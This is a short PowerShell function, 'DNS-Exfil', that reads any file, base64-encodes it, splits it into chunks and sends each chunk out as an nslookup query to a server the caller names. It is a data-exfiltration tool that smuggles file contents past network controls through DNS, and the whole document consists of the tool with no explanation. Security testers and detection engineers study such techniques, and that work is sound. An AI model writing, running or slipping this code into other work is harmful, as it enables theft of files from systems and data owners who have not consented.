function DNS-Exfil
{
    param (
    [Parameter(Mandatory=$true)]
    [string]$file,
    [string]$server
    )
  
    $EncodedText =[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file))
    $chunkSize = 57
    $chunks = @()
    $file = $file.Trim(".\")

    $i = 0
    While ($i -le ($EncodedText.length-$chunkSize))
    {
        $chunks += ($EncodedText.Substring($i,$chunkSize))
        $i += $chunkSize
    }

    $chunks += $EncodedText.Substring($i)
    $chunks | ForEach-Object {
    Write-Host "Sending Chunk: $_"
    $req=$_+"-."+$file
    nslookup $req $server
    }
}
